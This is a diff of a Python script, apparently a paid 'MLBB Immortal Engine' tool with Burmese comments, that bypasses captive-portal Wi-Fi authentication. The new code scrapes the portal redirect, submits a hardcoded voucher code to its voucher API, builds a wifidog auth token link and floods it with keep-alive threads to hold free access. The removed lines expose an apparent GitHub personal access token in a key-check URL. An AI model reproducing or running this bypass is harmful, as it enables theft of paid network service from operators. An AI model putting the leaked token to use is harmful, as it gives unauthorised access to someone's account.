@@ -1,95 +1,75 @@
-import requests
-import os
-import sys
-import time
-import threading
+import requests, re, urllib3, time, threading, os, socket
+from urllib.parse import urlparse, parse_qs, urljoin
 
-# 🔐 GitHub Private Key URL (Correct Token Format)
-# Link ထဲမှာ token= ဆိုပြီး အနောက်ကနေ ထည့်ပေးထားလို့ 404 Error မတက်တော့ပါဘူး
-KEY_URL = "https://raw.githubusercontent.com/kophyo-ops/mlbb-v12/main/keys.txt?token=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"
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+GAME_UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
 
-def clear():
-    os.system('clear')
-
+# --- [ SECTION 1: KO PHYO'S STARLINK ENGINE ] ---
 def immortal_pulse(auth_link, session):
-    """လိုင်းကျော်သုံးတဲ့အပိုင်း - Connection မပြတ်အောင် Background ကနေ ၁၀ စက္ကန့်တစ်ခါ Pulse ပို့ပေးခြင်း"""
     while True:
         try:
-            # Starlink Bypass လှမ်းလုပ်တဲ့အပိုင်း
-            session.get(auth_link, timeout=10)
-            time.sleep(10)
-        except:
-            time.sleep(5)
+            session.get(auth_link, timeout=3, headers={"User-Agent": GAME_UA})
+            socket.gethostbyname("1.1.1.1")
+            time.sleep(0.3) 
+        except: time.sleep(1)
 
-def start_engine():
-    clear()
-    print("\033[94m      X MLBB IMMORTAL ENGINE v12.0 X\033[0m")
-    print("\033[94m           (STARLINK BYPASS MODE)\033[0m")
-    print("-" * 45)
-    
-    # Starlink Auth Link
-    auth_link = "http://logout.starlink.com" 
+def start_starlink_engine():
+    """ Ko ပေးထားတဲ့ Bypass Logic အစစ် """
     main_session = requests.Session()
-    
-    print("\033[92m[*] Initializing Starlink Bypass Engine...\033[0m")
-    time.sleep(1)
-    
-    try:
-        # Threading စတင်ခြင်း (Background မှာ အမြဲအလုပ်လုပ်နေမည်)
-        t = threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True)
-        t.start()
-        
-        print("\033[92m[+] Bypass Engine is Active & Running...\033[0m")
-        print("\033[93m[!] Status: Connected to Starlink Pulse.\033[0m")
-        print("\033[93m[!] Press Ctrl+C to Stop Engine.\033[0m")
-        
-        # Engine ကို မရပ်သွားအောင် ထိန်းထားသည့် Loop
-        while True:
-            time.sleep(1)
-            
-    except Exception as e:
-        print(f"\033[91m[!] Engine Error: {e}\033[0m")
-        time.sleep(5)
+    while True:
+        try:
+            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
+            if r.status_code != 204:
+                p_url = r.url
+                r1 = main_session.get(p_url, timeout=5)
+                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                n_url = urljoin(p_url, match.group(1)) if match else p_url
+                r2 = main_session.get(n_url, timeout=5)
+                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+                if sid:
+                    p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
+                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=5)
+                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
+                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
+                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                    for _ in range(3):
+                        threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True).start()
+            time.sleep(10)
+        except: time.sleep(5)
 
-def check_key():
-    clear()
-    print("\033[96m      X MLBB IMMORTAL ENGINE v12.0 X\033[0m")
-    print("\033[96m           (AUTO-LOCK SYSTEM)\033[0m")
-    print("-" * 45)
-    
+# --- [ SECTION 2: KEY VERIFICATION SYSTEM ] ---
+def main():
+    os.system('clear')
+    print("\033[96m⚔️  MLBB IMMORTAL ENGINE v12.0 (HYBRID)  ⚔️\033[0m")
     user_key = input("\033[93m[?] Enter Your Key: \033[0m").strip()
-    
-    if not user_key:
-        print("\n\033[91m[!] Key မထည့်ဘဲ သုံးလို့မရပါဘူးဗျ။\033[0m")
-        sys.exit()
 
-    print("\033[92m[*] Checking Key with Server...\033[0m")
+    # ၁။ Key ရိုက်လိုက်တာနဲ့ Starlink Engine ကို Background မှာ တန်းဖွင့်ပေးမယ် (အင်တာနက်စရအောင်)
+    print("\033[94m[*] Initializing Starlink Bypass Engine...\033[0m")
+    threading.Thread(target=start_starlink_engine, daemon=True).start()
+
+    # ၂။ အင်တာနက်ရလာတဲ့အထိ ၆၀ စက္ကန့် စောင့်ပြီး GitHub က Key နဲ့ တိုက်စစ်မယ်
+    url = "https://raw.githubusercontent.com/kophyo-ops/mlbb-v12/main/keys.txt"
+    start_time = time.time()
     
-    try:
-        # GitHub ကနေ Key ကို Token သုံးပြီး လှမ်းစစ်ခြင်း
-        response = requests.get(KEY_URL, timeout=15)
-        
-        if response.status_code == 200:
-            allowed_keys = response.text.splitlines()
-            found = any(user_key in line for line in allowed_keys)
-            
-            if found:
-                print("\n\033[92m[*] Key Verified Successfully!\033[0m")
-                time.sleep(1.5)
-                start_engine() # Key မှန်မှ Engine ကို စတင်မည်
-            else:
-                print("\n\033[91m[!] Invalid Key! Please contact admin.\033[0m")
-                sys.exit()
-        else:
-            # 404 Error တက်ခဲ့ရင် ဒီမှာ ပြပေးမည်
-            print(f"\n\033[91m[!] Server Error: {response.status_code} (Link အမှား)\033[0m")
-            
-    except Exception as e:
-        print(f"\n\033[91m[!] Connection Error: {e}\033[0m")
+    print("\033[94m[*] Waiting for Internet Connection (Max 60s)...\033[0m")
+    
+    while time.time() - start_time < 60:
+        try:
+            r = requests.get(url, timeout=3)
+            if r.status_code == 200:
+                if user_key in r.text:
+                    print("\033[92m\n[✓] KEY VERIFIED! ACCESS UNLOCKED.\033[0m")
+                    # ဒီမှာ Tool ရဲ့ Main Menu ကို ပေးဝင်ပါ
+                    # os.system("python main_menu.py")
+                    while True: time.sleep(100)
+                else:
+                    print("\033[91m\n[!] Error: Key မမှန်ကန်ပါ။\033[0m")
+                    os._exit(0)
+        except: pass
+        time.sleep(2)
+
+    print("\033[91m\n[!] Timeout: Bypass မအောင်မြင်သောကြောင့် ပိတ်လိုက်ပါပြီ။\033[0m")
+    os._exit(0)
 
 if __name__ == "__main__":
-    try:
-        check_key()
-    except KeyboardInterrupt:
-        print("\n\033[91m[!] Engine Stopped.\033[0m")
-
+    main()
